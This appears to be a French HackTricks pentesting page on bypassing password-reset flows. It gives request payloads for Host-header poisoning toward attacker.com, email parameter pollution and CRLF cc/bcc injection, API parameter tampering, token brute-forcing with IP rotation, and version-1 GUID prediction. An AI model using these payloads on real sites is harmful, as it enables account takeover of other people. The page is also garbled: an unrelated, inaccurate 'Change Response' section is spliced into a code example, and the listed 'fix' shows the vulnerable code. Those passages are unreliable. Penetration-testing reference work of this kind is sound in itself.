# Contournement de r√©initialisation/mot de passe oubli√©

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lisez les tutoriels de bugs web3

üîî Recevez des notifications sur les nouveaux programmes de primes pour bugs

üí¨ Participez aux discussions de la communaut√©

Les techniques suivantes ont √©t√© recompil√©es √† partir de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Fuite de jeton de r√©initialisation de mot de passe via le r√©f√©rent

Le **r√©f√©rent HTTP** est un champ d'en-t√™te HTTP facultatif qui identifie l'adresse de la page Web qui est li√©e √† la ressource demand√©e. L'en-t√™te de requ√™te Referer contient l'adresse de la page Web pr√©c√©dente √† partir de laquelle un lien vers la page actuellement demand√©e a √©t√© suivi.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### Exploitation

* Demandez la r√©initialisation du mot de passe √† votre adresse e-mail
* Cliquez sur le lien de r√©initialisation du mot de passe
* Ne changez pas le mot de passe
* Cliquez sur n'importe quel site tiers (par exemple : Facebook, Twitter)
* Interceptez la requ√™te dans le proxy Burpsuite
* V√©rifiez si l'en-t√™te r√©f√©rent divulgue le jeton de r√©initialisation de mot de passe.

### Impact

Cela permet √† la personne qui contr√¥le un site particulier de changer le mot de passe de l'utilisateur (attaque CSRF), car cette personne conna√Æt le jeton de r√©initialisation de mot de passe de l'utilisateur.

### R√©f√©rence :

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Poisoning de r√©initialisation de mot de passe

Si vous trouvez une attaque d'en-t√™te d'h√¥te et qu'elle est hors de port√©e, essayez de trouver le bouton de r√©initialisation de mot de passe !

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Exploitation

* Interceptez la demande de r√©initialisation de mot de passe dans Burpsuite
* Ajoutez l'en-t√™te suivant ou modifiez l'en-t√™te dans Burpsuite (essayez un par un)
```
Host: attacker.com
```

```
 Host: target.com
 X-Forwarded-Host: attacker.com
```

```
 Host: target.com
 Host: attacker.com
```
* V√©rifiez si le lien pour changer le mot de passe dans l'e-mail pointe vers attacker.com

### Correctif

Utilisez `$_SERVER['SERVER_NAME']` plut√¥t que `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impact

La victime recevra le lien malveillant dans son courrier √©lectronique et, lorsqu'elle cliquera dessus, elle divulguera le lien / jeton de r√©initialisation de mot de passe de l'utilisateur √† l'attaquant, ce qui entra√Ænera la prise de contr√¥le compl√®te du compte.

### R√©f√©rence:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## R√©initialisation de mot de passe avec manipulation du param√®tre de courrier √©lectronique

### Exploitation

* Ajouter l'adresse e-mail de l'attaquant en tant que deuxi√®me param√®tre en utilisant &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Ajouter l'email de l'attaquant en tant que deuxi√®me param√®tre en utilisant %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Ajouter l'email de l'attaquant en tant que deuxi√®me param√®tre en utilisant |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Ajouter l'email de l'attaquant en tant que deuxi√®me param√®tre en utilisant cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Ajouter l'email de l'attaquant en tant que deuxi√®me param√®tre en utilisant bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Ajouter l'email de l'attaquant en tant que deuxi√®me param√®tre en utilisant ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Ajouter l'email de l'attaquant en tant que deuxi√®me param√®tre dans le tableau json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### R√©f√©rence

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Modification de l'e-mail et du mot de passe de n'importe quel utilisateur via les param√®tres de l'API

### Exploitation

* L'attaquant doit se connecter avec son compte et acc√©der √† la fonctionnalit√© de changement de mot de passe
* D√©marrer Burp Suite et intercepter la requ√™te
* Apr√®s avoir intercept√© la requ√™te, l'envoyer √† Repeater et modifier les param√®tres E-mail et Mot de passe
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### R√©f√©rence

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Pas de limitation de taux : bombardement de courriels <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### Exploitation

* D√©marrez Burp Suite et interceptez la demande de r√©initialisation de mot de passe
* Envoyez √† Intruder
* Utilisez une charge utile nulle

### R√©f√©rence

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## D√©couvrez comment le jeton de r√©initialisation de mot de passe est g√©n√©r√©

D√©couvrez le mod√®le de jeton de r√©initialisation de mot de passe

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Si elle est

* G√©n√©r√© en fonction de l'horodatage
* G√©n√©r√© en fonction de l'ID utilisateur
* G√©n√©r√© en fonction de l'e-mail de l'utilisateur
* G√©n√©r√© en fonction du pr√©nom et du nom de famille
* G√©n√©r√© en fonction de la date de naissance
* G√©n√©r√© en fonction de la cryptographie

Utilisez Burp Sequencer pour trouver l'al√©atoire ou la pr√©visibilit√© des jetons.

## GUID devinable

Il existe diff√©rents types de GUID :

* **Version 0 :** Ne se trouve que dans le GUID nul ("00000000-0000-0000-0000-000000000000").
* **Version 1 :** Le GUID est g√©n√©r√© de mani√®re pr√©visible en fonction de :
  * L'heure actuelle
  * Une "s√©quence d'horloge" g√©n√©r√©e de mani√®re al√©atoire qui reste constante entre les GUID pendant le temps de fonctionnement du syst√®me de g√©n√©ration
  * Un "ID de n≈ìud", qui est g√©n√©r√© en fonction de l'adresse MAC du syst√®me si elle est disponible
* **Version 3 :** Le GUID est g√©n√©r√© √† l'aide d'un hachage MD5 d'un nom et d'un espace de noms fournis.
* **Version 4 :** Le GUID est g√©n√©r√© de mani√®re al√©atoire.
* **Version 5 :** Le GUID est g√©n√©r√© √† l'aide d'un hachage SHA1 d'un nom et d'un espace de noms fournis.

Il est possible de regarder un GUID et de trouver sa version, il y a un petit outil pour cela : [**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Si la version utilis√©e pour g√©n√©rer un GUID de r√©initialisation de mot de passe est la version 1, il est possible de bruteforcer les GUIDS :
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### R√©f√©rences

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## Manipulation de la r√©ponse : Remplacer une mauvaise r√©ponse par une bonne

Recherchez des requ√™tes et des r√©ponses comme celles-ci
```php
HTTP/1.1 401 Unauthorized
(‚Äúmessage‚Äù:‚Äùunsuccessful‚Äù,‚ÄùstatusCode:403,‚ÄùerrorDescription‚Äù:‚ÄùUnsuccessful‚Äù)
```
# R√©initialisation de mot de passe

Lorsqu'un utilisateur demande une r√©initialisation de mot de passe, il est courant que le syst√®me envoie un e-mail avec un lien unique pour r√©initialiser le mot de passe. Cependant, il est possible que le lien envoy√© par e-mail soit vuln√©rable √† une attaque de type "Change Response".

## Technique

L'attaque de type "Change Response" consiste √† intercepter la requ√™te HTTP envoy√©e par l'utilisateur lorsqu'il clique sur le lien de r√©initialisation de mot de passe, puis √† modifier la r√©ponse HTTP renvoy√©e par le serveur. Cette attaque peut √™tre r√©alis√©e en utilisant un proxy HTTP tel que Burp Suite.

Lorsque l'utilisateur clique sur le lien de r√©initialisation de mot de passe, le proxy intercepte la requ√™te et la renvoie au serveur. Le serveur renvoie ensuite une r√©ponse HTTP contenant un formulaire permettant √† l'utilisateur de saisir un nouveau mot de passe. Le proxy intercepte cette r√©ponse et la modifie pour que le formulaire renvoie le nouveau mot de passe √† un serveur contr√¥l√© par l'attaquant.

## Contre-mesures

Pour se prot√©ger contre cette attaque, il est recommand√© d'utiliser des liens de r√©initialisation de mot de passe √† usage unique qui expirent apr√®s une p√©riode de temps limit√©e. Il est √©galement recommand√© d'utiliser des protocoles de s√©curit√© tels que HTTPS pour chiffrer les communications entre le client et le serveur.

Enfin, il est important de sensibiliser les utilisateurs aux risques de s√©curit√© associ√©s √† la r√©initialisation de mot de passe et de leur apprendre √† v√©rifier l'URL du site web avant de saisir des informations sensibles.
```php
HTTP/1.1 200 OK
(‚Äúmessage‚Äù:‚Äùsuccess‚Äù,‚ÄùstatusCode:200,‚ÄùerrorDescription‚Äù:‚ÄùSuccess‚Äù)
```
### R√©f√©rence

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Utilisation d'un jeton expir√© <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* V√©rifiez si le jeton expir√© peut √™tre r√©utilis√©.

### Brute Force du jeton de r√©initialisation de mot de passe <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Essayez de forcer le jeton de r√©initialisation en utilisant Burpsuite.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Utilisez IP-Rotator sur burpsuite pour contourner la limitation de taux bas√©e sur l'adresse IP.

### R√©f√©rence

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Essayez d'utiliser votre jeton <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Essayez d'ajouter votre jeton de r√©initialisation de mot de passe avec le compte de la victime.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### R√©f√©rence

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Invalidit√© de session lors de la d√©connexion/r√©initialisation de mot de passe

Lorsqu'un utilisateur se d√©connecte ou r√©initialise son mot de passe, la session en cours doit √™tre invalid√©e.\
Par cons√©quent, **r√©cup√©rez les cookies** pendant que l'utilisateur est connect√©, **d√©connectez-vous**, et **v√©rifiez** si les **cookies** sont toujours **valides**.\
R√©p√©tez le processus en **changeant le mot de passe** au lieu de vous d√©connecter.

## Temps d'expiration du jeton de r√©initialisation

Les **jetons de r√©initialisation doivent avoir un temps d'expiration**, apr√®s quoi le jeton ne doit plus √™tre valide pour changer le mot de passe d'un utilisateur.

## V√©rifications suppl√©mentaires

* Utilisez username@burp\_collab.net et analysez le rappel
* Utilisateur en copie carbone email=victim@mail.com%0a%0dcc:hacker@mail.com
* Un mot de passe long (>200) entra√Æne un d√©ni de service
* Ajoutez un deuxi√®me param√®tre et une valeur d'e-mail

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lisez les tutoriels de bugs web3

üîî Soyez inform√© des nouveaux programmes de primes pour bugs

üí¨ Participez aux discussions de la communaut√©

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
